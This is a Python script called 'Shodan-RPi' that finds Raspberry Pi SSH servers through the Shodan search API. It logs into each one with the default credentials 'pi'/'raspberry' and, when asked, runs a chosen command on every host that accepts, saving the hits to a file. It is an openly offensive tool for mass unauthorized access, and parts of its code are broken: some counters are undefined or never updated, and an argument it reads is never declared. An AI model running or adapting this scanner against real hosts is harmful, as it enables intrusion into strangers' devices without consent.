#!/usr/bin/env python3

import argparse, os, socket, sys, time
from multiprocessing import Pool
try:
	from colorama import Fore, init
	import paramiko, shodan
except ImportError:
	print('[-] Failed to import an external module.')
	import platform
	if platform.system() == 'Linux':
		print('    Run "pip install -r requirements.txt".')
		print('    This may also be "pip3" depending on your configuration.')
	elif platform.system() == 'Windows':
		print('    Run "python -m pip install -r requirements.txt".')
	else:
		print('    Please install the required modules inside the requirements.txt file.')
	sys.exit(1)

api_key = None # Set to None if you want to provide a key through arguments
version = "1.1.0"

init() # Colored output

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

parser = argparse.ArgumentParser()
parser.add_argument('-i',
					help='List of IPs',
					metavar='FILE',
					type=str,
					default=None) # Input file argument, by default it writes to memory (list/array)
parser.add_argument('-k',
					help='Use KEY as the Shodan API key',
					metavar='KEY',
					type=str,
					default=api_key) # API Key (the error on startup can be resolved by changing the api_key variable)
parser.add_argument('-paramiko-log',
					help='Log Paramiko SSH\'s progress to FILE',
					metavar='FILE',
					type=str) # Paramiko (the SSH client)'s log file location
parser.add_argument('-o',
					help='Output successful IPs to FILE',
					metavar='FILE',
					type=str,
					default='successful.txt') # Where to output successful IPs
parser.add_argument('-u',
					help='Use alternate username',
					metavar='USER',
					type=str,
					default='pi') # For alternate usernames
parser.add_argument('-p',
					help='Use alternate password',
					metavar='PASS',
					type=str,
					default='raspberry') # For alternate passwords
parser.add_argument('-t',
					help='Threads for multiprocessing',
					metavar='THREADS',
					type=int,
					default=8)
parser.add_argument('-debug',
					help='Show debug information',
					action='store_true')
parser.add_argument('-query-string',
					help='Use SSTRING as the Shodan query string',
					metavar='SSTRING',
					type=str,
					default='Raspbian SSH')
parser.add_argument('-ssh-key',
					help='Try auth with KEY as SSH key',
					metavar='KEY',
					type=str) # Public key auth (disabled with Shodan)
parser.add_argument('-c',
					help='Run CMD after a successful connection',
					metavar='CMD',
					type=str) # For example, run uname -a or lscpu
parser.add_argument('-limit',
					help='Maximum number of results to get from Shodan (default 100)',
					metavar='RESULTS',
					type=str,
					default=100)
parser.add_argument('-disable-multiproc',
					help='Disable multiprocessing support (slower, more complete output)',
					action='store_true')
args = parser.parse_args()

failtext = Fore.RED + '\tFAILED' + Fore.RESET
succtext = Fore.GREEN + '\tSUCCEEDED' + Fore.RESET

def fileCorrect():
	"""
		Check if the file provided using the -i/--input argument exists
	"""
	if args.i == None:
		return False
	try:
		return os.path.isfile(args.i) == True or os.path.getsize(args.i) != 0
	except:
		return False

def arrayWrite(shodandata=None):
	"""
		Parse the IPs in shodandata and write them to an array/list
	"""
	r = []
	print(Fore.CYAN + '[*]' + Fore.RESET + ' Creating array using Shodan IPs...')
	for a in shodandata['matches']:
		r.append(a['ip_str'])
	return r

def getShodanResults(apikey, searchstring=args.query_string, limit=args.limit):
	"""
		Poll Shodan for results
	"""
	print(Fore.CYAN + '[*]' + Fore.RESET + ' Getting results from Shodan; this may take a while...')
	api = shodan.Shodan(apikey)
	try:
		results = api.search(searchstring, limit=limit)
		return results
	except shodan.APIError as e:
		print((Fore.RED + '[-]' + Fore.RESET + ' Shodan API Error\n    Error string: %s\n\n    Please check the provided API key.' % str(e)))
		sys.exit(1)

def fileGet(shodandata=None):
	"""
		Call fileCorrect(), parse the IPs in shodandata, and write them to a file
	"""
	if not fileCorrect() and shodandata != None:
		print((Fore.YELLOW + '[!]' + Fore.RESET + ' %s doesn\'t exist, creating new file with Shodan results...' % args.i))
		try:
			with open(args.i, 'w') as m:
				for a in shodandata['matches']:
					m.write(a['ip_str']+'\n')
		except IOError as e:
			print((Fore.RED + '[-]' + Fore.RESET + ' Storage Write Error\n    Error string: %s\n\n    Please check that the directory you\'re in is writable by your user.' % str(e)))
			sys.exit(1)
		print((Fore.GREEN + '[+]' + Fore.RESET + ' Write to %s complete!' % args.i))
	g = open(args.i, 'r').readlines()
	return [g.strip() for g in g]

def apikey():
	"""
		Get the API key
	"""
	if args.k == None:
		print(Fore.RED + '[-]' + Fore.RESET + ' No API key provided. Either use the -k argument\n    or edit the script to include it. You can also use\n    the -i argument to provide a list of IPs.')
		sys.exit(1)
	else:
		return args.k

def connect(server, username, password=None, key=None, cmd=None):
	"""
		SSH connect function
	"""
	try:
		if password != None:
			ssh.connect(server, username=username, password=password, timeout=5, look_for_keys=False)
		elif key != None:
			ssh.connect(server, username=username, key_filename=key, timeout=5)
		with open(args.o, 'a') as fl:
			fl.write(server)
			if args.c:
				si, so, se = ssh.exec_command(cmd)
				time.sleep(1)
				si.close()
				fl.write(' | %s' % so.readlines())
			fl.write('\n')
		ssh.close()
		if args.c:
			return so.readlines()
		else:
			return 0 # Success
	except paramiko.AuthenticationException as g:
		return 1 # Authentication error
	except paramiko.ssh_exception.NoValidConnectionsError:
		return 2 # Connection error
	except socket.error:
		return 3 # Timeout
	except paramiko.ssh_exception.SSHException:
		return 4 # Generic SSH error
	except KeyboardInterrupt:
		return 9 # Interrupted
	except:
		return 5 # Unknown

def check(ip):
	"""
		Single-threaded check function - most stable
	"""
#	counter += 1
	print('[%s] %s ' % (counter, ip), end='')
	r = connect(ip, args.u, password=args.p, key=args.ssh_key, cmd=args.c)
	if r == 1:
		reason = ' [AUTHERR]' if args.debug else ''
		print((failtext + reason))
	elif r == 2 or r == 4:
		reason = ' [GENERAL]' if args.debug else ''
		print((failtext + reason))
	elif r == 3:
		reason = ' [TIMEOUT]' if args.debug else ''
		print((failtext + reason))
	elif r == 5:
		reason = ' [UNKNOWN]' if args.debug else ''
		print((failtext + reason))
	elif r == 9:
		raise KeyboardInterrupt
	else:
#		success += 1
		if not args.c:
			print(succtext)
		else:
			try:
				print('\t%s' % r[0].replace('\n', ''))
			except IndexError:
				print('\t[CMDREAD_FAIL]')

def check_multi(ip):
	"""
		Multi-threaded check function - only shows successful IPs, no counters, for now no error handling
	"""
	if args.debug:
		print("[D] Multiproc - check IP %s" % ip)
	r = connect(ip, args.u, password=args.p, key=args.ssh_key, cmd=args.c)
	if args.c:
		try:
			print('%s -- %s' % (ip, r[0].replace('\n', '')))
		except IndexError:
			print('%s -- NO OUTPUT' % ip)

def main():
	print(Fore.BLUE + '[i]' + Fore.RESET + ' Shodan-RPi %s\n    by btx3 (based on code by somu1795)' % version)
	if not fileCorrect():
		key = apikey()
	if args.i != None:
		print(('\n' + Fore.BLUE + '[i]' + Fore.RESET + ' Reading from %s' % args.i))
	else:
		print(('\n' + Fore.BLUE + '[i]' + Fore.RESET + ' Reading from %s' % ("SHODAN:" + key if args.debug else "Shodan results")))
	if args.paramiko_log:
		# Start logging
		paramiko.util.log_to_file(args.paramiko_log)
	counter = 0
	success = 0
	if not fileCorrect():
		shres = getShodanResults(key)
	else:
		shres = None
	if args.i == None:
		targets = arrayWrite(shodandata=shres) # Temporary results
	else:
		targets = fileGet(shodandata=shres) # From file
	print((Fore.BLUE + '[i]' + Fore.RESET + ' %s found\n' % (str(len(targets)) + ' target' if len(targets) < 2 else str(len(targets)) + ' targets')))
	try:
		if args.disable_multiproc:
			for ip in targets:
				check(ip)
		else:
			if args.debug:
				print("[D] Init multiprocessing Pool() with %s threads" % args.t)
			p = Pool(processes=args.t)
			result = p.map(check_multi, targets)
		if not args.indefinite:
			print(('\n' + Fore.GREEN + '[+]' + Fore.RESET + ' Completed!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
	except KeyboardInterrupt:
		print(('\n\n' + Fore.YELLOW + '[!]' + Fore.RESET + ' Interrupted!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
		sys.exit(0)

if __name__ == "__main__":
	main()
